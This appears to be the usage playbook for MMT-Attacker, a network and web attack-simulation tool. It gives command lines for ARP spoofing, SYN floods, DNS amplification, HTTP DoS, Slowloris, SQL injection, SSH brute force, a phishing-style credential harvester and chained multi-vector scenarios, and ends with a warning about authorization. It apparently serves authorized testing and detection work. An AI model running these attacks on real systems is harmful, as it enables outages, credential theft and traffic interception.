# MMT-Attacker CLI Playbook

This playbook provides detailed guidelines for using the MMT-Attacker CLI to perform simulation attacks, either via PCAP replay or using built-in attack scripts.

## Table of Contents
- [Prerequisites](#prerequisites)
- [Installation](#installation)
- [Basic Usage](#basic-usage)
- [PCAP Replay Attacks](#pcap-replay-attacks)
- [Network Attack Simulations](#network-attack-simulations)
- [Web Attack Simulations](#web-attack-simulations)
- [Best Practices](#best-practices)
- [Troubleshooting](#troubleshooting)

## Prerequisites

- Python 3.7 or higher
- Root/sudo privileges for certain attacks
- Network interface in promiscuous mode for packet capture/injection
- Required Python packages (see requirements.txt)

## Installation

```bash
# Clone the repository
git clone https://github.com/montimage/mmt-attacker.git
cd mmt-attacker

# Install dependencies
pip install -r requirements.txt

# Verify installation
python src/cli.py --help
```

## Basic Usage

The CLI follows this general syntax:
```bash
python src/cli.py <attack-type> [options]
```

Available attack types:
- `arp-spoof`: ARP spoofing attack
- `syn-flood`: SYN flood attack
- `dns-amplification`: DNS amplification attack
- `http-dos`: HTTP DoS attack
- `slowloris`: Slowloris attack
- `ssh-brute-force`: SSH brute force attack
- `sql-injection`: SQL injection attack
- `pcap-replay`: PCAP replay attack
- `ping-of-death`: Ping of Death attack
- `credential-harvester`: Credential harvesting attack

## PCAP Replay Attacks

### Basic PCAP Replay
```bash
python src/cli.py pcap-replay \
    --input-file /path/to/capture.pcap \
    --interface eth0
```

### Advanced PCAP Replay Options
```bash
python src/cli.py pcap-replay \
    --input-file /path/to/capture.pcap \
    --interface eth0 \
    --loop 3 \
    --speed 2.0 \
    --filter "tcp port 80" \
    --source-ip 192.168.1.100 \
    --target-ip 192.168.1.200 \
    --stats-interval 1.0 \
    --packet-log /path/to/log.txt
```

Key options:
- `--input-file`: PCAP file to replay
- `--interface`: Network interface to use
- `--loop`: Number of times to replay (0 for infinite)
- `--speed`: Replay speed multiplier (1.0 = original speed)
- `--filter`: BPF filter for packet selection
- `--source-ip`: Replace source IP in packets
- `--target-ip`: Replace destination IP in packets
- `--stats-interval`: Interval for printing statistics
- `--packet-log`: Log file for replayed packets

## Network Attack Simulations

### ARP Spoofing Attack
```bash
# Basic ARP spoofing
python src/cli.py arp-spoof \
    --target 192.168.1.100 \
    --gateway 192.168.1.1 \
    --interface eth0

# Advanced ARP spoofing
python src/cli.py arp-spoof \
    --target 192.168.1.100 \
    --target-mac 00:11:22:33:44:55 \
    --gateway 192.168.1.1 \
    --interface eth0 \
    --bidirectional \
    --aggressive \
    --restore-on-exit \
    --packet-log /path/to/log.pcap \
    --verify
```

### SYN Flood Attack
```bash
# Basic SYN flood
python src/cli.py syn-flood \
    --target 192.168.1.100 \
    --port 80 \
    --threads 4

# Advanced SYN flood
python src/cli.py syn-flood \
    --target 192.168.1.100 \
    --port-range 80-85 \
    --interface eth0 \
    --source-ip random \
    --randomize-source \
    --payload-size 100 \
    --window-size 16384 \
    --flags "SA" \
    --packet-log /path/to/log.pcap
```

### DNS Amplification Attack
```bash
# Basic DNS amplification
python src/cli.py dns-amplification \
    --target 192.168.1.100 \
    --dns-server 8.8.8.8 \
    --query-domain example.com

# Advanced DNS amplification
python src/cli.py dns-amplification \
    --target 192.168.1.100 \
    --dns-servers-file dns_servers.txt \
    --query-domain example.com \
    --query-type ANY \
    --recursive \
    --rotate-dns \
    --verify-amplification \
    --amplification-threshold 10.0
```

## Web Attack Simulations

### HTTP DoS Attack
```bash
# Basic HTTP DoS
python src/cli.py http-dos \
    --target http://example.com \
    --threads 10

# Advanced HTTP DoS
python src/cli.py http-dos \
    --target http://example.com \
    --method POST \
    --path /api/endpoint \
    --headers '{"X-Custom": "value"}' \
    --cookies '{"session": "abc123"}' \
    --data '{"key": "value"}' \
    --random-path \
    --random-query \
    --ramp-up 30 \
    --verify-success \
    --log-file /path/to/log.txt
```

### Slowloris Attack
```bash
# Basic Slowloris
python src/cli.py slowloris \
    --target example.com \
    --port 80 \
    --connections 150

# Advanced Slowloris
python src/cli.py slowloris \
    --target example.com \
    --port 80 \
    --connections 200 \
    --ssl \
    --keep-alive \
    --header-size 15 \
    --random-interval \
    --random-header \
    --verify-vuln \
    --log-file /path/to/log.txt
```

### SQL Injection Attack
```bash
# Basic SQL injection
python src/cli.py sql-injection \
    --target http://example.com/page.php \
    --parameter id \
    --payload "1' OR '1'='1"

# Advanced SQL injection
python src/cli.py sql-injection \
    --target http://example.com/page.php \
    --parameter id \
    --parameters-file params.txt \
    --dbms mysql \
    --prefix "'" \
    --suffix "-- -" \
    --encoding base64 \
    --risk 2 \
    --level 3 \
    --test-forms \
    --test-cookies \
    --report-format html \
    --output-dir /path/to/reports
```

### SSH Brute Force Attack
```bash
# Basic SSH brute force
python src/cli.py ssh-brute-force \
    --target 192.168.1.100 \
    --username admin \
    --wordlist passwords.txt

# Advanced SSH brute force
python src/cli.py ssh-brute-force \
    --target 192.168.1.100 \
    --targets-file targets.txt \
    --usernames-file users.txt \
    --passwords-file passwords.txt \
    --threads 4 \
    --delay 1.0 \
    --max-attempts 100 \
    --stop-on-success \
    --verify-access \
    --output-format json \
    --save-valid creds.json
```

### Ping of Death Attack
```bash
# Basic Ping of Death
python src/cli.py ping-of-death \
    --target 192.168.1.100

# Advanced Ping of Death
python src/cli.py ping-of-death \
    --target 192.168.1.100 \
    --size 65500 \
    --count 100 \
    --interval 0.1 \
    --interface eth0 \
    --verify \
    --packet-log /path/to/log.pcap
```

### Credential Harvester Attack
```bash
# Basic credential harvesting
python src/cli.py credential-harvester \
    --template login-form \
    --port 80

# Advanced credential harvesting
python src/cli.py credential-harvester \
    --template custom \
    --template-dir /path/to/templates \
    --port 443 \
    --ssl \
    --cert cert.pem \
    --key key.pem \
    --redirect-url https://legitimate-site.com \
    --log-file /path/to/harvested.txt
```

## Best Practices

1. **Testing Environment**
   - Always test in an isolated, controlled environment
   - Use virtual machines or containers when possible
   - Monitor system resources during attacks

2. **Network Configuration**
   - Configure network interfaces properly
   - Use appropriate network isolation
   - Monitor network traffic during attacks

3. **Attack Parameters**
   - Start with low values and gradually increase
   - Monitor target response and adjust accordingly
   - Use appropriate delays to avoid overwhelming systems

4. **Logging and Monitoring**
   - Enable appropriate logging
   - Monitor attack progress
   - Save attack results for analysis

5. **Safety Measures**
   - Use `--verify` options when available
   - Enable `--restore-on-exit` for stateful attacks
   - Set appropriate timeouts and limits

## Troubleshooting

### Common Issues

1. Permission Errors
```bash
# Run with sudo for attacks requiring raw socket access
sudo python src/cli.py arp-spoof ...
```

2. Interface Issues
```bash
# Set interface to promiscuous mode
sudo ip link set eth0 promisc on
```

3. Rate Limiting
```bash
# Adjust timing parameters
--delay 0.1 --interval 1.0
```

4. Resource Exhaustion
```bash
# Reduce thread count or connection count
--threads 4 --connections 100
```

### Debug Mode
```bash
# Enable verbose output
python src/cli.py <attack-type> --verbose

# Save debug logs
python src/cli.py <attack-type> --log-file debug.log --verbose
```

## Safety Warning

⚠️ **IMPORTANT**: This tool is for educational and testing purposes only. Always:
- Obtain proper authorization before testing
- Use in controlled environments only
- Follow responsible disclosure practices
- Comply with all applicable laws and regulations

## Examples of Attack Scenarios

### 1. Network Reconnaissance and ARP Poisoning
```bash
# Step 1: Scan network (external tool)
nmap -sn 192.168.1.0/24

# Step 2: ARP spoofing attack
python src/cli.py arp-spoof \
    --target 192.168.1.100 \
    --gateway 192.168.1.1 \
    --interface eth0 \
    --bidirectional \
    --packet-log mitm.pcap
```

### 2. Web Application Stress Testing
```bash
# Step 1: Slowloris attack
python src/cli.py slowloris \
    --target example.com \
    --connections 200 \
    --ssl \
    --verify-vuln

# Step 2: HTTP DoS attack
python src/cli.py http-dos \
    --target http://example.com \
    --threads 10 \
    --random-path \
    --verify-success
```

### 3. Credential Testing
```bash
# Step 1: SSH brute force
python src/cli.py ssh-brute-force \
    --target 192.168.1.100 \
    --usernames-file users.txt \
    --passwords-file passwords.txt \
    --stop-on-success

# Step 2: SQL injection
python src/cli.py sql-injection \
    --target http://example.com/login.php \
    --parameter username \
    --dbms mysql \
    --test-forms
```

### 4. DoS Testing with Traffic Replay
```bash
# Step 1: Capture baseline traffic
tcpdump -w baseline.pcap -i eth0

# Step 2: Replay with amplification
python src/cli.py pcap-replay \
    --input-file baseline.pcap \
    --interface eth0 \
    --speed 10.0 \
    --loop 0
```

### 5. Multi-Vector Attack Simulation
```bash
# Step 1: DNS amplification
python src/cli.py dns-amplification \
    --target 192.168.1.100 \
    --dns-servers-file servers.txt \
    --query-type ANY

# Step 2: SYN flood
python src/cli.py syn-flood \
    --target 192.168.1.100 \
    --port-range 80-443 \
    --randomize-source
```
